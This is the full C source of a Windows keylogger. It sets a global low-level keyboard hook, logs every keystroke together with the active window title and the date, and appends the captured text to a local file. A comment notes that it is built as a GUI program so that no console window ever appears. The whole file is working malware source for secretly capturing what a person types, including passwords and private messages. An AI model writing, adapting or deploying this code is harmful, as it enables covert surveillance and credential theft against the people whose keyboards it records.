#include <Windows.h>
#include <tchar.h>
#include <strsafe.h>

#define FLUSH_THRESHOLD 200

TCHAR lastWindowTitle[255];
TCHAR charsBuffered[FLUSH_THRESHOLD];
UINT charsBufferedCount = 0;
TCHAR windowTitle[255];
HHOOK keyboardHook = NULL;

// Time
const TCHAR* timeFormat = _T("%02d-%2d-%4d");
const TCHAR* windowDateTimeFormat = _T("\n\n[%s] %s\n");
// %02d are two chars, - is 1, we have two of them so (2 + 1 ) * 3, then for the year we have %04d so 4 chars
// the sum is 21, the problem is that we use _tsprintf() which requires to tell it the buffer size, so we must 
// divide the above number by sizeof(TCHAR), when the addition is even, we would have a too small buffer error.
// so we must always get an even number, this is why I add 1; Play with it to understand what I mean.
const size_t formattedTimeLen = ((((2 + 1) * 2 + (4)) * sizeof(TCHAR)) + 1) + 1 /*We must have even number*/;
TCHAR formattedTime[ ((((2 + 1) * 2 + (4)) * sizeof(TCHAR)) + 1) + 1 /*We must have an even number as size*/];
TCHAR messageWithTitle[400]; // should hold formattedTime and windowTitle

LRESULT WINAPI KeyLoggerProc(int code, WPARAM wParam, LPARAM lParam);
void OnKeyUp(DWORD virtualKeyCode);
void OnKeyDown(int virtualKeyCode);
void AppendToBuffer(const TCHAR* str, UINT len);
void WriteToFile();
void UninstallHook();

void OnKeyDown(int virtualKeyCode)
{
	const HWND hWnd = GetForegroundWindow();
	if (hWnd)
	{
		//get keyboard layout of the thread
		const DWORD threadID = GetWindowThreadProcessId(hWnd, NULL);
		HKL hKeyboardLayout = GetKeyboardLayout(threadID);

		// grab the window name if possible
		const size_t windowTitleLength = GetWindowTextLength(hWnd);

		if (windowTitleLength > 0)
		{
			const int textLength = GetWindowText(hWnd, windowTitle, 255);

			if (_tcscmp(windowTitle, lastWindowTitle) != 0)
			{
				_tcscpy_s(lastWindowTitle, 255, windowTitle);

				SYSTEMTIME system_time;
				GetLocalTime(&system_time);


				_stprintf_s(formattedTime, formattedTimeLen / sizeof(TCHAR), timeFormat, system_time.wDay,
				            system_time.wMonth,
				            system_time.wYear);

				_stprintf_s(messageWithTitle, 400, windowDateTimeFormat, formattedTime, windowTitle);
				AppendToBuffer(messageWithTitle, _tcslen(messageWithTitle));
			}
		}


		if (virtualKeyCode == VK_BACK)
			AppendToBuffer(_T("[BACKSPACE]"), _tcslen(_T("[BACKSPACE]")));
		else if (virtualKeyCode == VK_RETURN)
			AppendToBuffer(_T("\n"), _tcslen(_T("\n")));
		else if (virtualKeyCode == VK_SPACE)
			AppendToBuffer(_T(" "), _tcslen(_T(" ")));
		else if (virtualKeyCode == VK_TAB)
			AppendToBuffer(TEXT(" [TAB] "), _tcslen(_T("[TAB]")));
		else if (virtualKeyCode == VK_SHIFT || virtualKeyCode == VK_LSHIFT || virtualKeyCode == VK_RSHIFT)
			AppendToBuffer(TEXT("[SHIFT]"), _tcslen(_T("[SHIFT]")));
		else if (virtualKeyCode == VK_CONTROL || virtualKeyCode == VK_LCONTROL || virtualKeyCode == VK_RCONTROL)
			AppendToBuffer(_T("[CONTROL]"), _tcslen(_T("[CONTROL]")));
		else if (virtualKeyCode == VK_ESCAPE)
			AppendToBuffer(_T("[ESCAPE]"), _tcslen(_T("[ESCAPE]")));
		else if (virtualKeyCode == VK_END)
			AppendToBuffer(_T("[END]"), _tcslen(_T("[END]")));
		else if (virtualKeyCode == VK_HOME)
			AppendToBuffer(_T("[HOME]"), _tcslen(_T("[HOME]")));
		else if (virtualKeyCode == VK_LEFT)
			AppendToBuffer(_T("[LEFT]"), _tcslen(_T("[LEFT]")));
		else if (virtualKeyCode == VK_UP)
			AppendToBuffer(_T("[UP]"), _tcslen(_T("[UP]")));
		else if (virtualKeyCode == VK_RIGHT)
			AppendToBuffer(_T("[RIGHT]"), _tcslen(_T("[RIGHT")));
		else if (virtualKeyCode == VK_DOWN)
			AppendToBuffer(_T("[DOWN]"), _tcslen(_T("[DOWN]")));
		else if (virtualKeyCode == VK_OEM_PERIOD || virtualKeyCode == VK_DECIMAL)
			AppendToBuffer(_T("."), _tcslen(_T(".")));
		else if (virtualKeyCode == VK_OEM_MINUS || virtualKeyCode == VK_SUBTRACT)
			AppendToBuffer(_T("-"), _tcslen(_T("-")));
		else if (virtualKeyCode == VK_CAPITAL)
			AppendToBuffer(_T("[CAPSLOCK]"), _tcslen(_T("CAPSLOCK")));
		else
		{
			// Get the key string representation according to the keyboard layout
			const UINT key = MapVirtualKeyEx(virtualKeyCode, MAPVK_VK_TO_CHAR, hKeyboardLayout);

			const TCHAR typed = (TCHAR)key;

			AppendToBuffer(&typed, 1);
		}
	}
}

void OnKeyUp(DWORD virtualKeyCode)
{
}

void WriteToFile()
{
	const HANDLE hFile = CreateFile(
		TEXT("./filename.txt"),
		FILE_APPEND_DATA,
		FILE_SHARE_READ,
		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	DWORD dwBytesWritten;
	WriteFile(hFile, charsBuffered,
	          charsBufferedCount * sizeof(TCHAR),
	          &dwBytesWritten, NULL);
	CloseHandle(hFile);
}

void AppendToBuffer(const TCHAR* str, UINT len)
{
	if ((charsBufferedCount + len) > FLUSH_THRESHOLD && charsBufferedCount != 0)
	{
		WriteToFile();
		memset(charsBuffered, 0x00, FLUSH_THRESHOLD);
		charsBufferedCount = 0;
	}

	const UINT srcSize = len <= FLUSH_THRESHOLD ? len : FLUSH_THRESHOLD;
	memcpy_s(charsBuffered + charsBufferedCount, FLUSH_THRESHOLD * sizeof(TCHAR), str, srcSize * sizeof(TCHAR));
	charsBufferedCount += srcSize;

	if (len > FLUSH_THRESHOLD)
		AppendToBuffer(str + FLUSH_THRESHOLD, len - FLUSH_THRESHOLD);
}

void UninstallHook()
{
	BOOL success = UnhookWindowsHookEx(keyboardHook);
	keyboardHook = NULL;
}

LRESULT WINAPI KeyLoggerProc(int code, WPARAM wParam, LPARAM lParam)
{
	// Remember that inside the callback proc we have up to HKEY_CURRENT_USER\Control Panel\Desktop milliseconds
	// to handle the event, otherwise the system will go directly to the next hook
	// The docs state when code is less than 0 we should return CallNextHookEx
	if (code < 0)
		return CallNextHookEx(keyboardHook, code, wParam, lParam);

	KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lParam;
	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) // check when key is pressed down or hold
	{
		OnKeyDown(kbs->vkCode);
	}
	else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) // if key state is released
	{
		OnKeyUp(kbs->vkCode);
	}

	return CallNextHookEx(keyboardHook, code, wParam, lParam);
}


// Like if it was a GUI or Service Application, that way a Console is never shown.
int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                      _In_opt_ HINSTANCE hPrevInstance,
                      _In_ LPWSTR lpCmdLine,
                      _In_ int nCmdShow)
{
	memset(charsBuffered, 0x00, FLUSH_THRESHOLD);
	memset(lastWindowTitle, 0x00, 255);

	MSG message;

	// WH_KEYBOARD is for hooking keystrokes, LL means low level
	// TODO when I switch to WinMain, try replacing GetModuleHandle(NULL) by hInstance, indeed GetModuleHandle is only
	// used to get the hInstance
	// dwThreadId 0 means hook all threads
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyLoggerProc,
	                                hInstance
	                                , 0);
	if (!keyboardHook)
	{
		return FALSE;
	}
	while (GetMessage(&message, NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}

	return TRUE;
}
